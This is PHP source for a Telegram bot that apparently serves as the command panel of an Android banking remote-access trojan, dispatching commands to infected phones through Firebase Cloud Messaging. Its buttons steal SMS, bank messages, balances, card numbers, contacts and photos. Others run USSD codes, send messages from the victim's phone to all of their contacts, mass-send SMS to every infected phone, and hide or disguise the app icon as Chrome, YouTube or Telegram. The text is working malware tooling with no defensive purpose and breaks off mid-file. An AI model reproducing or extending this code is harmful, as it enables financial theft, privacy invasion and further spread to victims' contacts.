<?php

include("chalim.php");

define('TOKEN', $bot_token);
define('PORT_SUDO', $sudo_port);
define('PROJECT_ID', $project_id);
define('FILE', $file);

#Write Requirements
if (!file_exists("data")) {
    mkdir("data");
    mkdir("user");
}
if (!file_exists("link.txt")) {

    file_put_contents("link.txt", "https://google.com");
    file_put_contents("data/devices.txt", "");
    file_put_contents("data/contact.txt", "0");
    file_put_contents("data/firstsms.txt", "off");
    file_put_contents("data/autohide.txt", "off");
    file_put_contents("data/number-first.txt", "09123456789");
    file_put_contents("data/message-first.txt", $dev_id);
    file_put_contents("data/offline-number.txt", "09123456789");
    file_put_contents("user/index.php", "");
    file_put_contents("data/index.php", "");
    file_put_contents("data/pingmsg.txt", "0");
    file_put_contents("data/onlineusers.txt", "");
    file_put_contents("data/online_model.txt", "list");
    file_put_contents("data/autotar.txt", "off");
    file_put_contents("data/message_contacts.txt", "off");
    file_put_contents("data/online_users.json", "");
    file_put_contents("data/firstaction.json", '{"balance":"off","targetphone":"off","autohide":"off"}');

}
#ip function
function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}

#bot Function
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}

#Send Message Function
function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

#Edit Message Func
function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

function sf($file, $caption, $id = null)
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/sendDocument?chat_id=" . $id;
    $post = array('parse_mode' => 'HTML', 'caption' => "<b>$caption</b>", 'document' => new CURLFile(realpath("$file")));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}
function updateJsonValueInFile($filename, $key, $newValue)
{
    $jsonString = file_get_contents($filename);
    $data = json_decode($jsonString, true);
    if (!is_array($data)) {
        $data = [];
    }
    $data[$key] = $newValue;
    $updatedJsonString = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents($filename, $updatedJsonString);
}

function getFirstAction($key) {
    $data = null;
    if (file_exists("data/firstaction.json")) {
        $data = json_decode(file_get_contents("data/firstaction.json"));
    }
    return $data->$key ?? "off";
}
#regular requests
function getAccessToken($file)
{
    require 'vendor/autoload.php';
    $serviceAccountFilePath = "$file";
    $serviceAccount = json_decode(file_get_contents($serviceAccountFilePath), true);

    // Generate the JWT using the service account credentials
    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    // Get the OAuth 2.0 access token
    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $accessToken = json_decode($response)->access_token;

    return $accessToken;
}

#regular requests
function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("sath.txt", $result);
}

function send_sms_contact($dev_id_use)
{
    $send_sms_contacts = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "back_panel"], ['text' => "Send ››", 'callback_data' => "last_contacts $dev_id_use"]]
    ]]);
    return $send_sms_contacts;
}

function requestSMSContact($mode, $device_id, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

function requestGallery($device_id, $count)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => "gallery",
                "device_id" => $device_id,
                "more" => "$count"
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
}

#Sms Request
function requestSMS($mode, $device_id, $phone, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

#request to all subscribtion
function requestsAll($mode_all)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode_all
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("xd.txt", PROJECT_ID);

}

#check host Location Resolver
function location($node)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/nodes/hosts");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $loc = json_decode(curl_exec($ch), true)['nodes'][$node]['location'][2];
    curl_close($ch);
    return $loc;
}

#check filtering
function checkhost($domain)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-http?host=$domain&node=ir1.node.check-host.net&node=ir3.node.check-host.net&node=ir5.node.check-host.net&node=ir6.node.check-host.net");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $id = json_decode(curl_exec($ch), true)['request_id'];
    sleep(2);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-result/$id");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    $arr = array();
    foreach ($result as $node => $value) {
        if (isset($value)) {
            $name = location($node);
            $arr[$name] = ['time' => $value[0][1], 'status' => $value[0][2], 'statuscode' => $value[0][3], "serverip" => $value[0][4]];
        }
    }
    return $arr;
}
    
function getPaginatedUsers($page, $pageSize = 20)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $totalUsers = count($onlineUsers);
    $totalPages = ceil($totalUsers / $pageSize);
    $page = max(1, min($totalPages, $page)); // Ensure page is within bounds

    $start = ($page - 1) * $pageSize;
    $usersOnPage = array_slice($onlineUsers, $start, $pageSize, true);

    return ['users' => $usersOnPage, 'totalUsers' => $totalUsers, 'totalPages' => $totalPages, 'currentPage' => $page];
}

function createInlineKeyboard($currentPage, $totalPages)
{
    $keyboard = [];

    if ($totalPages > 1) {
        if ($currentPage > 1) {
            $keyboard[] = ['text' => 'Previous', 'callback_data' => 'page_' . ($currentPage - 1)];
        }
        if ($currentPage < $totalPages) {
            $keyboard[] = ['text' => 'Next', 'callback_data' => 'page_' . ($currentPage + 1)];
        }
    }

    return json_encode(['inline_keyboard' => [$keyboard]]);
}

function updateMessageWithUsers($chatId, $messageId, $currentPage)
{
    $pagination = getPaginatedUsers($currentPage);
    $users = $pagination['users'];
    $totalUsers = $pagination['totalUsers'];
    $totalPages = $pagination['totalPages'];

    $text = "📡ᴀᴄᴛɪᴏɴ : #ᴘɪɴɢ_ᴀʟʟ\n\n";
    foreach ($users as $androidid => $name) {
        $text .= "<code>/set_$androidid</code>\n";
    }
    $text .= "\nusers: $totalUsers\n";
    $text .= "Page {$pagination['currentPage']}/$totalPages\n";
    $text .= "➖➖➖➖➖➖➖➖➖➖\n👨‍💻ᴄᴏᴅᴇᴅ ʙʏ : <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>";

    $keyboard = createInlineKeyboard($pagination['currentPage'], $totalPages);

    emg($chatId, $messageId, $text, $keyboard);
}

#----------------------------------------------------------------------
#telegram Update Requirements 
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = $update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id) ? $update->callback_query->message->chat->id : $update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id) ? $update->callback_query->message->from->id : $update->message->from->id;
$text = $update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
#---------------------------------------------------------------------
#shourt Callers Value
$command = file_get_contents("user/$chat_id/command.txt");
$text_message = file_get_contents("user/$chat_id/message.txt");
$device_id = file_get_contents("user/$chat_id/device-id.txt");
$device_model = file_get_contents("user/$chat_id/device-model.txt");
$number_message = file_get_contents("user/$chat_id/numberlist.txt");
$ringer_mode = file_get_contents("user/$chat_id/ringer.txt");
$apk_mode = file_get_contents("user/$chat_id/apk.txt");
$action_autohide = file_get_contents("data/autohide.txt");
$status_offline = file_get_contents("user/$device_id-offline.txt");
$target_name = file_get_contents("user/$device_id-name.txt");
$install_ip = file_get_contents("user/$device_id-ip.txt");
$action_firstsms = file_get_contents("data/firstsms.txt");
$offline_number = file_get_contents("data/offline-number.txt");
$model_online = file_get_contents("data/online_model.txt");
$auto_tar = file_get_contents("data/autotar.txt");
$contact = file_get_contents("data/contact.txt");
$link_show = file_get_contents("link.txt");
#----------------------------------------------------------------
#shishe ei
$start_button = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "💎 ʙʀᴏᴀᴅᴄᴀꜱᴛ 💎", 'callback_data' => 'setting'], ['text' => "🛰️ ᴀʟʟ ᴛᴀʀɢᴇᴛꜱ ᴘɪɴɢ 🛰️", 'callback_data' => 'online_checo']],
    [['text' => "🔥 ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴ 🔥", 'callback_data' => 'firstaction']],
    [['text' => "🛠️ ʀᴀᴛ ꜱᴇᴛᴛɪɴɢꜱ 🛠️", 'callback_data' => 'rat_set'], ['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ʜᴇʟᴘ 📶", 'callback_data' => 'offmode_help']]
]]);

$goooo = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "🌐 ᴄʜᴀɴɢᴇ ᴅᴏᴍᴀɪɴ 🌐", 'callback_data' => 'set_url'], ['text' => "🧫 ᴄʜᴇᴄᴋ ʜᴏꜱᴛ 🧫", 'callback_data' => 'checkhost']],
    [['text' => "🗃 ɢᴇᴛ ᴀᴘᴋ 🗃", 'callback_data' => 'apkk'], ['text' => "🔖 sʜᴏᴡ ᴅᴏᴍᴀɪɴ 🔖", 'callback_data' => 'show_url']],
    [['text' => "‹‹ back", 'callback_data' => 'back_home']]
]]);
$goooo2 = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "🗃️ ᴏɴʟɪɴᴇ ᴍᴏᴅᴇʟ 🗃️", 'callback_data' => 'online_model'], ['text' => "$model_online", 'callback_data' => 'online_model']],
    [['text' => "📄 ᴇᴅɪᴛ ᴛᴇxᴛ ᴍᴀssᴀɢᴇ 📄", 'callback_data' => 'edit_message_all']],
    [['text' => "", 'callback_data' => 'set_word'], ['text' => "search_all", 'callback_data' => 'search_all']],
    [['text' => "📄ꜱᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ ᴛᴇxᴛ ᴍᴀssᴀɢᴇ 📄", 'callback_data' => 'set_message_contacts']],
    [['text' => "🧬 ᴀᴜᴛᴏ ᴛᴀʀ", 'callback_data' => 'autotar'], ['text' => "$auto_tar", 'callback_data' => 'autotar']],
    [['text' => "‹‹ back", 'callback_data' => 'back_home']]
]]);

#==================== Offline Mode Help Button ====================
$offmode_help_button = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "📶 ꜱᴇᴛ ᴏꜰꜰʟɪɴᴇ ɴᴜᴍʙᴇʀ 📶", 'callback_data' => 'set_number_offline_mode']],
    [['text' => "⏫ ʙᴀᴄᴋ ⏫", 'callback_data' => 'back_home']]
]]);
#==============================================================

#start button
function control_button($dev_id_use)
{
    $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
    $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

    $device_id = file_get_contents("user/$dev_id_use-model.txt");
    $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");

    $control_button = json_encode([
        'resize_keyboard' => false,
        'inline_keyboard' => [
            # ======== بخش ۱: کنترل دستگاه ========
            [
                ['text' => "📡 ᴘɪɴɢ ᴛᴀʀɢᴇᴛ 📡", 'callback_data' => "status_user $dev_id_use"]
            ],
            [
                ['text' => "🔒 ᴏꜰꜰʟɪɴᴇ ᴏɴ 🔒", 'callback_data' => "offmodeon $dev_id_use"],
                ['text' => "🔓 ᴏꜰꜰʟɪɴᴇ ᴏꜰꜰ 🔓", 'callback_data' => "offmodeoff $dev_id_use"]
            ],
            
            # ======== بخش ۲: مدیریت پیامک ========
            [
                ['text' => "📥 ɪɴʙᴏx 📥", 'callback_data' => "recived $dev_id_use"],
                ['text' => "📤 ᴏᴜᴛʙᴏx 📤", 'callback_data' => "sent $dev_id_use"]
            ],
            [
                ['text' => "📋 ꜱᴍꜱ ʟɪꜱᴛ 📋", 'callback_data' => "Popo $dev_id_use"],
                ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $dev_id_use"]
            ],
            [
                ['text' => "📨 ꜱᴇɴᴅ ꜱᴍꜱ 📨", 'callback_data' => "send_sms $dev_id_use"],
                ['text' => "🔍 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ 🔍", 'callback_data' => "searchSMS $dev_id_use"]
            ],
            
            # ======== بخش ۳: عملیات بانکی ========
            [
                ['text' => "🏦 ʟᴀꜱᴛ ʙᴀɴᴋ 🏦", 'callback_data' => "last_Bank_sms $dev_id_use"],
                ['text' => "📊 ʙᴀɴᴋ ʟɪꜱᴛ 📊", 'callback_data' => "All_Bank_sms $dev_id_use"]
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ 👻", 'callback_data' => "hide_icon $dev_id_use"],
                ['text' => "💰 ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $dev_id_use"]
            ],
            [
                ['text' => "💳 ᴄᴀʀᴅ ɴᴜᴍʙᴇʀꜱ 💳", 'callback_data' => "cardnumbers $dev_id_use"]
            ],
            [
                ['text' => "📬 ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ 📬", 'callback_data' => "sms_contacts $dev_id_use"]
            ],
            
            # ======== بخش ۴: تنظیمات سیستم ========
            [
                ['text' => "🔊 ɴᴏʀᴍᴀʟ 🔊", 'callback_data' => "normal_mode $dev_id_use"],
                ['text' => "🔇 ꜱɪʟᴇɴᴛ 🔇", 'callback_data' => "silent_mode $dev_id_use"]
            ],
            [
                ['text' => "🎨 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🎨", 'callback_data' => "change $dev_id_use"],
                ['text' => "👀 ꜱʜᴏᴡ ɪᴄᴏɴ 👀", 'callback_data' => "visible_icon $dev_id_use"]
            ],
            
            # ======== بخش ۵: ابزارها ========
            [
                ['text' => "📟 ᴜꜱꜱᴅ ᴄᴏᴅᴇ 📟", 'callback_data' => "ussdcode $dev_id_use"],
                ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ 📞", 'callback_data' => "userphone $dev_id_use"]
            ],
            [
                ['text' => "📷 ɢᴀʟʟᴇʀʏ 📷", 'callback_data' => "gallery $dev_id_use"],
                ['text' => "👤 ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ 👤", 'callback_data' => "all_contacts $dev_id_use"]
            ],
            [
                ['text' => "ℹ️ ꜰᴜʟʟ ɪɴꜰᴏ ℹ️", 'callback_data' => "information $dev_id_use"]
            ],
            
            # ======== بخش ۶: بازگشت ========
            [
                ['text' => "🔙 ʙᴀᴄᴋ ᴘᴀɴᴇʟ 🔙", 'callback_data' => "back_home"]
            ]
        ]
    ]);
    return $control_button;
}

#info button
function info_button($dev_id_use)
{
    $device_id = file_get_contents("user/$dev_id_use-model.txt");
    $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");


    $info_button = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
        [['text' => "ɴᴀᴍᴇ ᴛᴀʀɢᴇᴛ", 'callback_data' => "nametarget $dev_id_use"]],
        [['text' => "ᴄʟᴇᴀʀ ᴀʟʟ ɪɴꜰᴏ", 'callback_data' => "clearinfo $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]]
    ]]);
    return $info_button;
}

$settings_button = json_encode([
    'resize_keyboard' => false,
    'inline_keyboard' => [
        [['text' => "🪄 ᴀᴜᴛᴏ ʜɪᴅᴅᴇɴ 🪄", 'callback_data' => 'null'], ['text' => "$action_autohide", 'callback_data' => 'auto_hide']],
        [['text' => "📶 ᴏғғ ᴍᴏᴅᴇ ɴᴜᴍʙᴇʀ 📶", 'callback_data' => 'set_number_offline_mode'], ['text' => "$offline_number", 'callback_data' => 'null']],
        [['text' => "📤 sᴍs ʙᴏᴍʙᴇʀ ᴀʟʟ 📤", 'callback_data' => 'sms_all'], ['text' => "🔇 ᴍᴜᴛᴇ ᴀʟʟ ᴛᴀʀɢᴇᴛ 🔇", 'callback_data' => 'silent_all']],
        [['text' => "🔰 ʜɪᴅᴇ ɪᴄᴏɴ ᴀʟʟ 🔰", 'callback_data' => 'hide_all'], ['text' => "💰 ʙᴀɴᴋ ɪɴғᴏ ᴀʟʟ 💰", 'callback_data' => 'get_all_balance']],
        [['text' => "", 'callback_data' => 'set_word'], ['text' => "search_all", 'callback_data' => 'search_all']],
        [['text' => "⏫ ʙᴀᴄᴋ ⏫", 'callback_data' => 'back_home']]
    ]
]);

$back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']]
]]);
$onli_btn = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "‹‹ Send Requests››", 'callback_data' => 'online_checo']]
]]);
$back_home = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_home']]
]]);
$back_settings = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']]
]]);
$dev_inline = json_encode(array('inline_keyboard' => [
    [['text' => "Get Pv Dev", 'url' => "t.me/$dev_id"]]
]));
$url_inline = json_encode(array('inline_keyboard' => [
    [['text' => "$link_show", 'url' => "$link_show"]],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']]
]));

function gallery_button($dev_id_use)
{
    $gallery_button = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
        [['text' => "📷 ʟᴀꜱᴛ 100", 'callback_data' => "gallery_100 $dev_id_use"]],
        [['text' => "📷 ᴀʟʟ", 'callback_data' => "gallery_all $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]]
    ]]);
    return $gallery_button;
}

function sms_button($dev_id_use)
{
    $sms_button = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
        [['text' => "Edite Text", 'callback_data' => "edit_message $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"], ['text' => "Next ››", 'callback_data' => "set_list $dev_id_use"]]
    ]]);
    return $sms_button;
}

$model_button = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [[['text' => "ʟɪꜱᴛ", 'callback_data' => 'list_model'], ['text' => "ꜱɪɴɢᴇʟ", 'callback_data' => 'singel_model']],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']],
]]);
$changeiconButton = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [[['text' => "ᴄʜʀᴏᴍᴇ", 'callback_data' => 'chrome'], ['text' => "ᴛᴇʟᴇɢʀᴀᴍ", 'callback_data' => 'telegram']],
    [['text' => "ʏᴏᴜᴛᴜʙᴇ", 'callback_data' => 'youtube'], ['text' => "ɢᴏᴏɢʟᴇ", 'callback_data' => "google $datass[1]"]],
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']],
]]);
function getsmsButton($dev_id_use)
{
    $getsmsButton = json_encode(['resize_keyboard' => false, 'inline_keyboard' =>
        [[['text' => "📤ᴏᴜᴛʙᴏx📤", 'callback_data' => "sent $dev_id_use"], ['text' => "📥ɪɴʙᴏx📥", 'callback_data' => "recived $dev_id_use"]],
            [['text' => "📨ᴀʟʟ ꜱᴍꜱ📨", 'callback_data' => "Popo $dev_id_use"]],
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]],
        ]]);
    return $getsmsButton;
}

$sms_button_all = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "Edite Text", 'callback_data' => 'edit_message_all']],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings'], ['text' => "Next ››", 'callback_data' => 'set_list_all']]
]]);
function back_sms($dev_id_use)
{
    $back_sms = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"]]
    ]]);
    return $back_sms;
}

function send_sms($dev_id_use)
{
    $send_sms = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"], ['text' => "Send ››", 'callback_data' => "last_send $dev_id_use"]]
    ]]);
    return $send_sms;
}

$send_sms_all = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings'], ['text' => "Send ››", 'callback_data' => 'last_send_all']]
]]);
if (in_array($chat_id, $sudo_user)) {
    if (preg_match('/^\/([Ss]tart)(.*)/', $text)) {
        if (!file_exists("user/$chat_id")) {
            mkdir("user/$chat_id");
            file_put_contents("user/$chat_id/command.txt", "");
            file_put_contents("user/$chat_id/message.txt", "$dev_id");
            file_put_contents("user/$chat_id/device-id.txt", "");
            file_put_contents("user/$chat_id/device-model.txt", "null");
            file_put_contents("user/$chat_id/numberlist.txt", "");
            file_put_contents("user/$chat_id/ringer.txt", "Normal");
            file_put_contents("user/$chat_id/apk.txt", "Visible");
        }
        
        smg($chat_id, "
<blockquote>┌🩸 ʜᴇʟʟᴏ*: <a href='tg://user?id=$from_id'>$first_n</a>
├🕸 ꜱᴛᴀᴛᴜꜱ*: ᴏᴘᴇʀᴀᴛɪᴏɴᴀʟ
├☠️ ᴘᴏʀᴛ*: <code>$sudo_port</code>
├👁️ ᴜꜱᴇʀꜱ-ᴄᴏᴜɴᴛ*: $contact
├🦇 ᴅᴀᴛᴇ ʙᴜʏ*: <code>$dateBuy</code>
└⚰️ ᴇxᴘɪʀᴇ,ʀᴇᴍᴏᴛᴇ*: <code>$expir</code></blockquote>
────────────────
<blockquote>🕸 <a href='https://t.me/QQaVaNeN'> › ᴢɪʀᴇx</a></blockquote>
", $start_button);


    } elseif (strpos($text, '/check') !== false) {
        $ex = explode("-", $text);
        $device_id = $ex[1];

    } elseif ($data == "back_home") {
        emg($chat_id, $mi, "‹‹ <b>Back Home</b> ›› section\n\n<blockquote>🕸 <a href='https://t.me/QQaVaNeN'> › ᴢɪʀᴇx</a></blockquote>", $start_button);
        file_put_contents("user/$chat_id/command.txt", "");
        file_put_contents("user/$chat_id/ringer.txt", "Normal");
        file_put_contents("user/$chat_id/apk.txt", "Visible");
        file_put_contents("user/$chat_id/device-id.txt", "");
        file_put_contents("user/$chat_id/device-model.txt", "null");


    } elseif (strpos($data, "sms_contacts") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $sms_button = sms_button($device_id);


        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Send SMS To Contacts</b> ›› section\n\nText Message : [ <code>$text_message</code> ]", send_sms_contact($device_id));

    } elseif (strpos($data, "last_contacts") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];


        file_put_contents("user/$chat_id/command.txt", "");
        requestSMSContact("smcontact", $device_id, $text_message);
        emg($chat_id, $mi, "‹‹ <b>Send SMS To Contacts</b> Started - Response Will Send When Job Finished", $back_control);

    } elseif (strpos($data, 'back_panel') !== false) {

        $datass = explode(" ", $data);
        $control_button = control_button($datass[1]);

        emg($chat_id, $mi, "<b>🧩 ᴅᴇᴠɪᴄᴇ ᴄᴏɴᴛʀᴏʟ</b>
🗞 ʜᴇʟʟᴏ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ\n\n🏝 ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ", $control_button);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "back_settings") {

        emg($chat_id, $mi, "‹‹ <b>Back Settings</b> ›› section\n\nSelect the desired option :", $settings_button);
        file_put_contents("user/$chat_id/command.txt", "");
#------------------------------------------------------- 
#KalamatVorodi
        /*} elseif ($text == "Online Devices") {
            file_put_contents("data/onlineusers.txt", "");


